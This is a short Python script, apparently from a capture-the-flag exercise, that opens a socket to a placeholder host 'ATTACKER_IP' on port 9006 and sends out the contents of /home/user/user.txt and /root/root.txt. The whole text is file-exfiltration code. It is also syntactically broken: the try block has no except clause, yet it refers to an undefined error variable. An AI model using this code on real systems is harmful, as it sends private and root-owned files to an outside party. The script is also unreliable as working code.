import socket
files=['/home/user/user.txt','/root/root.txt']
with socket.create_connection(('ATTACKER_IP',9006)) as s:
    for f in files:
        try:
            with open(f,'rb') as fh:
                data=fh.read()
            s.sendall((f"FILE:{f}\n").encode()+data+b"\nEOF\n")

            s.sendall((f"ERR:{f}:{e}\n").encode())
